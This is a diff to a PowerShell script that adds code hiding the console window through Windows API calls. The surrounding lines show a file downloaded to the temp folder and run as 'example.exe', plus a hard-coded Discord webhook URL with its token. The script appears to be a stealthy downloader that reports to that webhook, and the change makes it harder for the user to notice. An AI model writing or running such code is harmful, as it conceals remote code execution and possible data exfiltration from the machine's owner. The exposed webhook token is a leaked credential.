@@ -37,6 +37,33 @@
 # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 # ##############################################################################
 
+##############################################
+
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
+        public static void Hide() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_HIDE);
+        }
+        public static void Show() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_SHOW);
+        }
+    }
+"@
+
+# Hide the console window
+[ConsoleWindow]::Hide()
+
+######################################################################################
 
 
 # Define the URL of the file to be downloaded
@@ -109,9 +136,6 @@ Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Proc
 #Write-Host "Process completed and all instances closed."
 
 
-
-
-######################################################################################
 
 # Define the webhook URL
 $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
